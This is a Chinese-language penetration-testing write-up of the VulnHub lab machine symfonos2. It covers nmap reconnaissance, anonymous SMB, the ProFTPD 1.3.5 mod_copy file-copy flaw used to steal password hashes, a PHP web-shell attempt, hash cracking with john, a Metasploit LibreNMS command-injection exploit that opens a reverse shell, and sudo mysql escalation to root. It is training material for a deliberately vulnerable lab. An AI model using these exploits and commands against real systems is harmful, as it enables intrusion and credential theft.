+++
date = '2026-10-21T20:12:11+08:00'
draft = false
title = '【VulnHub靶机】symfonos2渗透记录'
tags = ['渗透','vulnhub','靶机']
+++

## 信息搜集

攻击机IP: `192.168.200.146`  
使用arp-scan获得靶机IP`192.168.200.161`

```shell
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l                        
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5f:ca:d5, IPv4: 192.168.200.146
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.200.1   00:50:56:c0:00:08       (Unknown)
192.168.200.2   00:50:56:fc:41:2a       (Unknown)
192.168.200.161 00:0c:29:c2:7d:49       (Unknown)
192.168.200.254 00:50:56:ec:d0:be       (Unknown)

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.921 seconds (133.26 hosts/sec). 4 responded
```

全端口扫描

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap --min-rate 10000 -p- 192.168.200.161
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-21 20:15 +0800
Nmap scan report for 192.168.200.161
Host is up (0.00064s latency).
Not shown: 65530 closed tcp ports (reset)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:C2:7D:49 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.71 seconds
```

对发现的端口进行详细扫描

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sT -sV -O -sC -p21,22,80,139,445 192.168.200.161
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-21 20:16 +0800
Nmap scan report for 192.168.200.161
Host is up (0.00036s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.5
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 9d:f8:5f:87:20:e5:8c:fa:68:47:7d:71:62:08:ad:b9 (RSA)
|   256 04:2a:bb:06:56:ea:d1:93:1c:d2:78:0a:00:46:9d:85 (ECDSA)
|_  256 28:ad:ac:dc:7e:2a:1c:f6:4c:6b:47:f2:d6:22:5b:52 (ED25519)
80/tcp  open  http        WebFS httpd 1.21
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: webfs/1.21
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 00:0C:29:C2:7D:49 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 1 hop
Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos2
|   NetBIOS computer name: SYMFONOS2\x00
|   Domain name: \x00
|   FQDN: symfonos2
|_  System time: 2026-10-21T07:16:25-05:00
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: SYMFONOS2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-10-21T12:16:25
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.05 seconds
```

浏览器访问Web服务, 依旧是一张图片

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/symfonos2/%E8%AE%BF%E9%97%AEweb%E6%9C%8D%E5%8A%A1.avif)

爆破网站目录, 没有任何收获

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/symfonos2/%E7%BD%91%E7%AB%99%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4.avif)

## 漏洞利用

### smb匿名共享

smbclient扫一下共享, 发现anonymous共享,

```shell
┌──(kali㉿kali)-[~]
└─$ smbclient -L 192.168.200.161 -N         

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      
        IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            SYMFONOS2
```

尝试登录, 果然成功了, 发现里面有个backup文件夹, 里面是log.txt, 把它下载下来

```shell
┌──(kali㉿kali)-[~]
└─$ smbclient //192.168.200.161/anonymous -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul 18 22:30:09 2019
  ..                                  D        0  Thu Jul 18 22:29:08 2019
  backups                             D        0  Thu Jul 18 22:25:17 2019

                19728000 blocks of size 1024. 16313736 blocks available
smb: \> cd backups\
smb: \backups\> ls
  .                                   D        0  Thu Jul 18 22:25:17 2019
  ..                                  D        0  Thu Jul 18 22:30:09 2019
  log.txt                             N    11394  Thu Jul 18 22:25:16 2019

                19728000 blocks of size 1024. 16313736 blocks available
smb: \backups\> get log.txt 
getting file \backups\log.txt of size 11394 as log.txt (2781.7 KiloBytes/sec) (average 2781.7 KiloBytes/sec)
```

log.txt中记录了smb.conf和proftpd.conf两个配置文件的内容, 从中我们能知道:
- **shadow文件在/var/backups/shadow.bak有备份**
- /home/aeolus/share 为anonymous的共享文件夹
- FTP允许匿名登录

```shell
root@symfonos2:~# cat /etc/shadow > /var/backups/shadow.bak
```

```text
[anonymous]
   path = /home/aeolus/share
   browseable = yes
   read only = yes
   guest ok = yes
```

```text
<Anonymous ~ftp>
  User				ftp
  Group				ftp

  # We want clients to be able to login with "anonymous" as well as "ftp"
  UserAlias			anonymous ftp

  # Limit the maximum number of anonymous logins
  MaxClients			10

  # We want 'welcome.msg' displayed at login, and '.message' displayed
  # in each newly chdired directory.
  #DisplayLogin			welcome.msg
  #DisplayChdir			.message

  # Limit WRITE everywhere in the anonymous chroot
  <Limit WRITE>
    DenyAll
  </Limit>
</Anonymous>
```

### ProFTPd

匿名登录FTP, 发现能执行的命令很少

```shell
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.200.161       
Connected to 192.168.200.161.
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [192.168.200.161]
Name (192.168.200.161:kali): ftp
331 Anonymous login ok, send your complete email address as your password
Password: 
530 Login incorrect.
ftp: Login failed
ftp> site help
214-The following SITE commands are recognized (* =>'s unimplemented)
 CPFR <sp> pathname
 CPTO <sp> pathname
 HELP
 CHGRP
 CHMOD
214 Direct comments to root@symfonos2
```

使用searchsploit搜索服务漏洞

```shell
┌──(kali㉿kali)-[~]
└─$ searchsploit ProFTPD 1.3.5
----------------------------------- ---------------------------------
 Exploit Title                     |  Path
----------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote  | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote  | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy          | linux/remote/36742.txt
----------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

我们使用36742.txt:

```text
Description TJ Saunders 2015-04-07 16:35:03 UTC
Vadim Melihow reported a critical issue with proftpd installations that use the
mod_copy module's SITE CPFR/SITE CPTO commands; mod_copy allows these commands
to be used by *unauthenticated clients*:

---------------------------------
Trying 80.150.216.115...
Connected to 80.150.216.115.
Escape character is '^]'.
220 ProFTPD 1.3.5rc3 Server (Debian) [::ffff:80.150.216.115]
site help
214-The following SITE commands are recognized (* =>'s unimplemented)
214-CPFR <sp> pathname
214-CPTO <sp> pathname
214-UTIME <sp> YYYYMMDDhhmm[ss] <sp> path
214-SYMLINK <sp> source <sp> destination
214-RMDIR <sp> path
214-MKDIR <sp> path
214-The following SITE extensions are recognized:
214-RATIO -- show all ratios in effect
214-QUOTA
214-HELP
214-CHGRP
214-CHMOD
214 Direct comments to root@www01a
site cpfr /etc/passwd
350 File or directory exists, ready for destination name
site cpto /tmp/passwd.copy
250 Copy successful
-----------------------------------------

He provides another, scarier example:

------------------------------
site cpfr /etc/passwd
350 File or directory exists, ready for destination name
site cpto <?php phpinfo(); ?>
550 cpto: Permission denied
site cpfr /proc/self/fd/3
350 File or directory exists, ready for destination name
site cpto /var/www/test.php

test.php now contains
----------------------
2015-04-04 02:01:13,159 slon-P5Q proftpd[16255] slon-P5Q
(slon-P5Q.lan[192.168.3.193]): error rewinding scoreboard: Invalid argument
2015-04-04 02:01:13,159 slon-P5Q proftpd[16255] slon-P5Q
(slon-P5Q.lan[192.168.3.193]): FTP session opened.
2015-04-04 02:01:27,943 slon-P5Q proftpd[16255] slon-P5Q
(slon-P5Q.lan[192.168.3.193]): error opening destination file '/<?php
phpinfo(); ?>' for copying: Permission denied
-----------------------

test.php contains contain correct php script "<?php phpinfo(); ?>" which
can be run by the php interpreter

Source: http://bugs.proftpd.org/show_bug.cgi?id=4169
```

阅读可知, ProFTP 1.3.5的mod_copy模块实现了两个SITE命令:  

- SITE CPFR <source>：指定要复制的源文件。
- SITE CPTO <destination>：指定复制的目标路径。

这两个命令没有检查当前会话是否已通过 USER/PASS 认证  
一种方法是, 如果Web目录可写, 我们可以通过向ProFTP发送包含恶意php代码字符串的错误命令, 这样ProFTP就会将包含恶意php代码的错误日志写入/proc/self/fd/3, 然后再通过CPFR/CPTO将日志复制到Web服务器目录, 最后在浏览器中请求该页面获得反弹shell

```shell
ftp> site cpfr /etc/passwd            
350 File or directory exists, ready for destination name
ftp> site cpto <?php system($_POST['cmd']);?>
550 cpto: Permission denied
ftp> site cpfr /proc/self/fd/3
350 File or directory exists, ready for destination name
ftp> site cpto /var/www/html/shell.php 
550 cpto: Permission denied
```

显然Web目录不可写, 该法失效  
那么我们尝试将shadow文件复制到anonymous共享文件夹(/home/aeolus/share)中

```shell
ftp> site cpfr /etc/passwd
350 File or directory exists, ready for destination name
ftp> site cpto /home/aeolus/share/passwd
250 Copy successful
ftp> site cpfr /etc/shadow
350 File or directory exists, ready for destination name
# shadow本体无权复制, 选择复制其备份
ftp> site cpto /home/aeolus/share/shadow
550 cpto: Permission denied

ftp> site cpfr /var/backups/shadow.bak
350 File or directory exists, ready for destination name
ftp> site cpto /home/aeolus/share/shadow
250 Copy successful
```

使用smbclient匿名登录并下载这两个文件

```shell
┌──(kali㉿kali)-[~]
└─$ smbclient //192.168.200.161/anonymous -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Oct 21 22:07:57 2026
  ..                                  D        0  Thu Jul 18 22:29:08 2019
  passwd                              N     1614  Wed Oct 21 21:58:15 2026
  backups                             D        0  Thu Jul 18 22:25:17 2019
  shadow                              N     1173  Wed Oct 21 22:07:57 2026

                19728000 blocks of size 1024. 16312908 blocks available
smb: \> get passwd
getting file \passwd of size 1614 as passwd (525.4 KiloBytes/sec) (average 525.4 KiloBytes/sec)
smb: \> get shadow
getting file \shadow of size 1173 as shadow (572.7 KiloBytes/sec) (average 544.3 KiloBytes/sec)
```

查看shadow文件, 发现有root, aeolus, cronus三个用户有哈希值

```shell
─$ cat shadow                                                                                                                22:11 [6/620]
root:$6$VTftENaZ$ggY84BSFETwhissv0N6mt2VaQN9k6/HzwwmTtVkDtTbCbqofFO8MVW.IcOKIzuI07m36uy9.565qelr/beHer.:18095:0:99999:7::: 
daemon:*:18095:0:99999:7:::
bin:*:18095:0:99999:7:::
sys:*:18095:0:99999:7:::
sync:*:18095:0:99999:7:::
games:*:18095:0:99999:7:::
man:*:18095:0:99999:7:::
lp:*:18095:0:99999:7:::
mail:*:18095:0:99999:7:::
news:*:18095:0:99999:7:::
uucp:*:18095:0:99999:7:::
proxy:*:18095:0:99999:7:::
www-data:*:18095:0:99999:7:::
backup:*:18095:0:99999:7:::
list:*:18095:0:99999:7:::
irc:*:18095:0:99999:7:::
gnats:*:18095:0:99999:7:::
nobody:*:18095:0:99999:7:::
systemd-timesync:*:18095:0:99999:7:::
systemd-network:*:18095:0:99999:7:::
systemd-resolve:*:18095:0:99999:7:::
systemd-bus-proxy:*:18095:0:99999:7:::
_apt:*:18095:0:99999:7:::
Debian-exim:!:18095:0:99999:7:::
messagebus:*:18095:0:99999:7:::
sshd:*:18095:0:99999:7:::
aeolus:$6$dgjUjE.Y$G.dJZCM8.zKmJc9t4iiK9d723/bQ5kE1ux7ucBoAgOsTbaKmp.0iCljaobCntN3nCxsk4DLMy0qTn8ODPlmLG.:18095:0:99999:7:::
cronus:$6$wOmUfiZO$WajhRWpZyuHbjAbtPDQnR3oVQeEKtZtYYElWomv9xZLOhz7ALkHUT2Wp6cFFg1uLCq49SYel5goXroJ0SxU3D/:18095:0:99999:7:::
mysql:!:18095:0:99999:7:::
Debian-snmp:!:18095:0:99999:7:::
librenms:!:18095::::::
```

使用john爆破, 发现aeolus的密码: sergioteamo

```shell
┌──(kali㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt pwdhash.txt
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sergioteamo      (aeolus)
```

SSH登录成功

```shell
┌──(kali㉿kali)-[~]
└─$ ssh aeolus@192.168.200.161
The authenticity of host '192.168.200.161 (192.168.200.161)' can't be established.
ED25519 key fingerprint is: SHA256:bVM6iESUngv842ilwZ5pthpPxRaIrgL4RxNNbnBFssQ
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.200.161' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
aeolus@192.168.200.161's password: 
Linux symfonos2 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 18 08:52:59 2019 from 192.168.201.1
aeolus@symfonos2:~$
```

## 权限提升

### 枚举

ss查看靶机套接字统计信息, 发现本地开放了一个8080端口, 结合passwd中存在librenms用户, 猜测存在LibreNMS用户

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/symfonos2/%E5%8F%91%E7%8E%B08080%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1.avif)

由于该服务只在本地开放, 需要通过ssh隧道将流量转发到攻击机上

```shell
ssh -L 8080:127.0.0.1:8080 aeolus@192.168.200.161
```

现在攻击机访问http://127.0.0.1:8080/, 发现是LibreNMS界面

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/symfonos2/LibreNMS.avif)

使用aeolus:sergioteamo登录

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/symfonos2/%E7%99%BB%E5%BD%95%E6%88%90%E5%8A%9F.avif)

在msfconsole中搜索漏洞

```shell
msf > search LibreNMS
Matching Modules
================
   #  Name                                                          Disclosure Date  Rank       Check  Description                         
   -  ----                                                          ---------------  ----       -----  -----------                         
   0  exploit/linux/http/librenms_authenticated_rce_cve_2024_51092  2024-11-15       excellent  Yes    LibreNMS Authenticated RCE (CVE-2024-51092)
   1  exploit/linux/http/librenms_collectd_cmd_inject               2019-07-15       excellent  Yes    LibreNMS Collectd Command Injection 
   2  exploit/linux/http/librenms_addhost_cmd_inject                2018-12-16       excellent  No     LibreNMS addhost Command Injection  
```

使用2

```shell
msf exploit(linux/http/librenms_addhost_cmd_inject) > set username aeolus
username => aeolus
msf exploit(linux/http/librenms_addhost_cmd_inject) > set password sergioteamo
password => sergioteamo
msf exploit(linux/http/librenms_addhost_cmd_inject) > set lhost 192.168.200.146
lhost => 192.168.200.146
msf exploit(linux/http/librenms_addhost_cmd_inject) > set rport 8080
rport => 8080
msf exploit(linux/http/librenms_addhost_cmd_inject) > set rhost 127.0.0.1
rhost => 127.0.0.1
msf exploit(linux/http/librenms_addhost_cmd_inject) > run
[*] Started reverse TCP double handler on 192.168.200.146:4444 
[*] Successfully logged into LibreNMS. Storing credentials...
[+] Successfully added device with hostname oCumQrCKgDV
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[+] Successfully deleted device with hostname oCumQrCKgDV and id #1
[*] Command: echo vELnkHHhzJq3J9LY;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "vELnkHHhzJq3J9LY\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 1 opened (192.168.200.146:4444 -> 192.168.200.161:36328) at 2026-10-21 23:15:35 +0800

whoami
cronus
```

### 提权

输入sudo -l, 发现可以无密码以root权限执行MySQL

```shell
sudo -l
Matching Defaults entries for cronus on symfonos2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cronus may run the following commands on symfonos2:
    (root) NOPASSWD: /usr/bin/mysql
```

直接使用mysql提权

```shell
sudo mysql -e "\! /bin/bash"
whoami
root
```

读取flag

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/symfonos2/flag.avif)